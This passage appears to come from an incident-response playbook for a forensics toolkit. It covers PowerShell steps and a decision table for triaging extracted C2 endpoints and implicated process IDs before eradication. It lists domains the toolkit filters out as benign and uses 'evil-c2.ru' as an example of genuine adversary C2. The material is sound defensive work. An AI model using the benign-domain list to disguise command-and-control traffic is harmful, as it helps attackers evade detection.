# Step 2: The toolkit now filters benign infrastructure automatically (_is_benign_domain).
# These will NOT appear in c2_endpoints (Phase 1C fix):
#   *.adobe.com / *.acrobat.com / *.adobelogin.com / *.adobe.io  (AdobeCollabSync FP)
#   ocsp.*, crl.*                                                  (cert validation)
#   schemas.openxmlformats.org, iptc.org, purl.org                (namespace URIs)
#   *.microsoft.com / *.live.com / *.office.com                   (Microsoft infra)
#   www.youtube.com / gitforwindows.org                            (browser cache)

# Step 3: For anything remaining, verify it's NOT legitimate infrastructure
$iocs.c2_endpoints | ForEach-Object {
    $host_ = $_.host
    Write-Host "Review: $host_"
    # Submit to VT / Shodan offline -- DO NOT resolve live on the target host
}

# Step 4: Remove confirmed-benign entries before eradication
# $iocs.c2_endpoints = @($iocs.c2_endpoints | Where-Object { <adversary-only-filter> })
# $iocs | ConvertTo-Json -Depth 10 | Set-Content .\reports\<host>\IOCs.json

# Step 5: Also review memory_eradication.implicated_pids
# Remove any PID confirmed as FP before the eradication process loop runs
$iocs.memory_eradication.implicated_pids | ForEach-Object { Write-Host "Implicated PID: $_" }
```

**Logic breakdown:**

| Condition | What it means | Action |
|-----------|--------------|--------|
| `c2_endpoints` has 0 entries | No adversary C2 found in process memory | Do not run Block-C2 step; proceed to persistence eradication only |
| `c2_endpoints` has entries from `*.adobe.com`, `*.digicert.com` | Filter failed or ran against FP PIDs | The toolkit now suppresses these via `_is_benign_domain()`; if they appear, check which PIDs were enriched |
| `c2_endpoints` has entries like `evil-c2.ru`, bare IPs (non-RFC1918) | Genuine adversary C2 recovered | Cross-reference with OSINT (VT, Shodan, OTX); add to firewall block; run Block-C2 playbook |
| `***` or other malformed entries in c2_endpoints | Extraction artifact from netscan null records | The toolkit now filters via `_is_valid_ioc_host()`; if these appear, toolkit version is pre-Phase 1C fix |
| `memory_eradication.implicated_pids` includes confirmed-FP PIDs | Enrichment ran over FP processes | Remove those PIDs from the list; their memory_eradication data is noise |

> **Rule:** Only enrich PIDs with OPEN or TP adjudication verdicts. Skip PIDs already closed as FP — this prevents IOCs.json contamination and wastes scan time.
